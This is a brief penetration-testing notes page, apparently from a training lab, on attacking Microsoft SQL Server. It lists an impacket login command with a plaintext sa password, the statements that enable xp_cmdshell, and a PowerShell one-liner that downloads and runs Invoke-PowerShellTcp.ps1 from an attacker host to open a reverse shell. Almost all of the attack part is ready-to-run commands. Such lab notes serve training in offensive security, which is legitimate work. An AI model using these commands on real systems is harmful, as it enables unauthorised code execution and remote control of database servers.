# MSSQL

### Getting Access

Use impacket to connect to the server

```abap
impacket-mssqlclient  -port 1435 sa:EjectFrailtyThorn425@192.168.116.70
```

![Untitled](MSSQL%203ccca60abe454be8bee82e97c920a60a/Untitled.png)

### Code execution

Run these commands to get code execution. Learn more about it from [RALPH](https://www.notion.so/PWK-10-11-1-31-RALPH-527a00a6d3ec405b858ee725d7e1b096).

```abap
sp_configure "show advanced options", "1";
reconfigure;
sp_configure "xp_cmdshell", "1";
reconfigure;
exec master..xp_cmdshell "powershell /c iex(new-object net.webclient).downloadstring('http://192.168.119.210/Invoke-PowerShellTcp.ps1')"
```